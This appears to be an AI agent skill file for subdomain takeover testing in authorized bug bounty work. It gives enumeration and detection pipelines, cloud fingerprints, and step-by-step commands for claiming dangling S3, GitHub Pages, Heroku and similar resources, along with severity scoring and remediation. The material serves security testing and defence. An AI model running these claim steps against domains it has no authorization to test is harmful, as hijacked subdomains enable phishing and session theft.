---
name: subdomain-takeover
description: Subdomain takeover specialist for authorized bug bounty and penetration tests — covers automated detection with subjack and nuclei templates, cloud-specific fingerprints (AWS S3, Azure, GitHub Pages, Netlify, Heroku, Fastly, Cloudflare, Shopify), dangling CNAME identification, PoC claim process for responsible disclosure, and remediation. Use when enumerating subdomains or when a CNAME points to an unclaimed external service.
---

## Trigger

Fire when: user says "subdomain takeover", "dangling CNAME", "CNAME pointing to unclaimed", "subjack", "can-i-take-over-xyz", "subdomain hijack", "S3 subdomain takeover", "GitHub Pages takeover", "Netlify takeover", "Heroku subdomain", "unclaimed external service", or any request to detect/exploit subdomain takeover vulnerabilities.

---

## Version Pins (2026-10-31 verified)

| Tool | Version | Install |
|------|---------|---------|
| subjack | **1.1** | `go install github.com/haccer/subjack@latest` |
| nuclei | **3.3.8** | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@v3.3.8` |
| subfinder | **2.6.7** | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@v2.6.7` |
| dnsx | **1.2.1** | `go install github.com/projectdiscovery/dnsx/cmd/dnsx@v1.2.1` |
| httpx | **1.6.10** | `go install github.com/projectdiscovery/httpx/cmd/httpx@v1.6.10` |
| can-i-take-over-xyz | reference | https://github.com/EdOverflow/can-i-take-over-xyz |

---

## Instructions

### Phase 1: Subdomain Enumeration
```bash
# Enumerate subdomains
subfinder -d target.com -all -o subdomains.txt

# Resolve live subdomains only
cat subdomains.txt | dnsx -silent -o live-subdomains.txt

# Get CNAMEs for all live subdomains
cat live-subdomains.txt | dnsx -cname -silent -o cnames.txt
```

### Phase 2: Takeover Detection
```bash
# Run subjack against all subdomains
subjack -w subdomains.txt -t 100 -timeout 30 -o takeover-results.txt -ssl -v

# Run nuclei takeover templates
nuclei -l subdomains.txt -t http/takeovers/ -o nuclei-takeovers.txt

# Manual CNAME dangling check
cat cnames.txt | grep -E "(s3|azure|github|netlify|heroku|fastly|shopify)"
```

### Phase 3: Claim / PoC
1. Identify the service the dangling CNAME points to.
2. Register/claim the resource at that service (S3 bucket, GitHub Pages repo, etc.).
3. Serve a simple HTML PoC page: `<h1>Subdomain Takeover PoC - [your name] - [date]</h1>`
4. Screenshot the owned subdomain serving your page.
5. Immediately delete/release the claim after screenshot.
6. Submit to program with screenshot, CNAME chain, and DNS evidence.

### Phase 4: Report
- CVSS: 7.5–9.0 HIGH depending on subdomain sensitivity (login/auth subdomains = CRITICAL).
- Required artifacts: subdomain, CNAME chain (`dig +short sub.target.com CNAME`), PoC screenshot.

---

## 1. Full Automated Pipeline

```bash
#!/bin/bash
# subdomain-takeover-scan.sh — full pipeline
TARGET=${1:-target.com}

echo "[1] Enumerating subdomains..."
subfinder -d "$TARGET" -all -silent -o /tmp/subs.txt
echo "Found: $(wc -l < /tmp/subs.txt) subdomains"

echo "[2] Resolving live subdomains..."
cat /tmp/subs.txt | dnsx -silent -o /tmp/live.txt
echo "Live: $(wc -l < /tmp/live.txt)"

echo "[3] Extracting CNAMEs..."
cat /tmp/live.txt | dnsx -cname -silent -json | \
  jq -r 'select(.cname != null) | "\(.host) → \(.cname[])"' > /tmp/cnames.txt
echo "CNAMEs: $(wc -l < /tmp/cnames.txt)"

echo "[4] Running subjack..."
subjack -w /tmp/live.txt -t 50 -timeout 20 -o /tmp/subjack.txt -ssl -v 2>/dev/null

echo "[5] Running nuclei takeover templates..."
nuclei -l /tmp/live.txt -t http/takeovers/ -silent -o /tmp/nuclei-takeovers.txt

echo "[6] Results:"
echo "  Subjack: $(wc -l < /tmp/subjack.txt 2>/dev/null || echo 0) potential"
echo "  Nuclei:  $(wc -l < /tmp/nuclei-takeovers.txt 2>/dev/null || echo 0) findings"
cat /tmp/subjack.txt /tmp/nuclei-takeovers.txt 2>/dev/null
```

---

## 2. Cloud-Specific Fingerprints

### AWS S3

**CNAME pattern:** `*.s3.amazonaws.com` or `*.s3-website-{region}.amazonaws.com`

**Vulnerable response:**
```
NoSuchBucket
The specified bucket does not exist.
```

**PoC claim:**
```bash
# Create the bucket with the exact name matching the CNAME
aws s3 mb s3://target-subdomain-name --region us-east-1

# Upload PoC file
echo "<h1>Subdomain Takeover PoC</h1>" | \
  aws s3 cp - s3://target-subdomain-name/index.html \
  --content-type text/html --acl public-read

# Enable static hosting
aws s3 website s3://target-subdomain-name \
  --index-document index.html

# Confirm
curl http://sub.target.com/
```

---

### GitHub Pages

**CNAME pattern:** `*.github.io`

**Vulnerable response:**
```
There isn't a GitHub Pages site here.
```

**PoC claim:**
```bash
# Create a new GitHub repo with the exact username/org name
# that the CNAME points to (e.g., target-org.github.io)

# In the repo, add CNAME file pointing to the subdomain
echo "sub.target.com" > CNAME
git add CNAME index.html && git commit -m "PoC" && git push

# Enable GitHub Pages in repo settings → Source: main branch
```

---

### Netlify

**CNAME pattern:** `*.netlify.app` or `*.netlify.com`

**Vulnerable response:**
```
Not found - Request ID: ...
```

**PoC claim:**
```bash
# Create a new Netlify site
# netlify.com → "New site from Git" or "Deploy manually"
# Go to Domain settings → Add custom domain → enter sub.target.com
# Netlify will claim it if the CNAME already points to Netlify
```

---

### Heroku

**CNAME pattern:** `*.herokuapp.com` or custom Heroku DNS targets

**Vulnerable response:**
```
No such app
```

**PoC claim:**
```bash
# Create a Heroku app with the exact name
heroku create exact-app-name-from-cname

# Add custom domain
heroku domains:add sub.target.com --app exact-app-name-from-cname

# Deploy minimal PoC
mkdir poc && cd poc
echo "web: python3 -m http.server \$PORT" > Procfile
echo "<h1>Takeover PoC</h1>" > index.html
git init && git add . && git commit -m "poc"
heroku git:remote -a exact-app-name-from-cname
git push heroku main
```

---

### Azure (App Service / Azure CDN / Traffic Manager)

**CNAME pattern:** `*.azurewebsites.net`, `*.azureedge.net`, `*.trafficmanager.net`, `*.cloudapp.azure.com`

**Vulnerable response:**
```
404 Web Site Not Found
Error 404 - Web app not found.
```

**Detection:**
```bash
# Confirm the CNAME chain
dig +short sub.target.com CNAME
# Output: something.azurewebsites.net.

# Confirm resource gone
curl -I https://something.azurewebsites.net
# HTTP 404 → potentially claimable
```

---

### Fastly

**CNAME pattern:** `*.fastly.net` or `*.global.ssl.fastly.net`

**Vulnerable response:**
```
Fastly error: unknown domain: sub.target.com
```

**PoC claim:**
```bash
# Create Fastly service with custom domain
# Fastly console → New Service → Add domain: sub.target.com
# Fastly will accept the domain if the CNAME points to Fastly
```

---

### Shopify

**CNAME pattern:** `shops.myshopify.com`

**Vulnerable response:**
```
Sorry, this shop is currently unavailable.
```

**PoC claim:** Create a new Shopify store and add sub.target.com as custom domain.

---

### Cloudflare Pages

**CNAME pattern:** `*.pages.dev`

**Vulnerable response:**
```
... (empty page or Cloudflare generic error)
```

**Note:** Cloudflare itself is often used to proxy; look for `pages.dev` in CNAME specifically.

---

## 3. Dangling CNAME Detection (Manual)

```bash
# Check for NXDOMAIN on CNAME target (dangling)
dig +short sub.target.com CNAME
# Output: something.someservice.com.

dig +short something.someservice.com A
# Output: (empty or NXDOMAIN) → dangling CNAME, potentially takeable

# Batch check CNAMEs for dangling
while IFS= read -r line; do
  CNAME=$(dig +short "$line" CNAME)
  if [ -n "$CNAME" ]; then
    RESOLVES=$(dig +short "$CNAME" A)
    if [ -z "$RESOLVES" ]; then
      echo "DANGLING: $line → $CNAME"
    fi
  fi
done < subdomains.txt
```

---

## 4. Fingerprint Reference (can-i-take-over-xyz updated 2026)

| Service | Fingerprint string | Vulnerable |
|---------|--------------------|-----------|
| AWS S3 | `NoSuchBucket` | YES |
| GitHub Pages | `There isn't a GitHub Pages site here` | YES |
| Netlify | `Not found - Request ID:` | YES (under conditions) |
| Heroku | `No such app` | YES |
| Azure App Service | `404 Web Site Not Found` | YES |
| Fastly | `Fastly error: unknown domain` | YES |
| Shopify | `Sorry, this shop is currently unavailable` | YES |
| Tumblr | `There's nothing here` | EDGE |
| WordPress.com | `Do you want to register` | NO (protected) |
| Zendesk | `Help Center Closed` | YES (with config) |
| Pantheon | `403 Forbidden` + `Pantheon` | YES |
| Fly.io | `404 Not Found` + fly headers | YES |

Full list: https://github.com/EdOverflow/can-i-take-over-xyz

---

## 5. Severity Scoring

| Subdomain type | CVSS | Rationale |
|---------------|------|-----------|
| `auth.`, `sso.`, `login.`, `account.` | **9.0+ CRITICAL** | Session theft, credential phishing |
| `api.`, `api-v1.` | 8.5 HIGH | API key theft, data exfiltration |
| `mail.`, `smtp.` | 8.0 HIGH | Email spoofing, SPF bypass |
| `cdn.`, `static.`, `assets.` | 7.5 HIGH | XSS delivery, content poisoning |
| `dev.`, `staging.` | 7.0 HIGH | Recon, credential leakage |
| Marketing/blog subdomains | 6.0 MEDIUM | Phishing, reputation damage |

---

## Remediation

| Issue | Fix |
|-------|-----|
| Dangling CNAME | Remove DNS record immediately if resource no longer exists |
| S3 bucket name squatting | Delete DNS record; use random bucket names |
| GitHub Pages | Remove CNAME file from repo or delete DNS record |
| General | Audit DNS records quarterly; use infrastructure-as-code for DNS |
| Detection | Monitor DNS records for unexpected NXDOMAIN via dnsx in CI |

---

## References

- `haccer/subjack` v1.1 — https://github.com/haccer/subjack (MIT)
- `EdOverflow/can-i-take-over-xyz` — https://github.com/EdOverflow/can-i-take-over-xyz
- nuclei takeover templates — https://github.com/projectdiscovery/nuclei-templates/tree/main/http/takeovers
- `projectdiscovery/subfinder` v2.6.7 — https://github.com/projectdiscovery/subfinder
- HackerOne disclosure guidance — https://www.hackerone.com/vulnerability-management/guide-subdomain-takeover-vulnerabilities
- CVE-2025-29386 (Azure subdomain takeover class) — https://nvd.nist.gov/vuln/detail/CVE-2025-29386
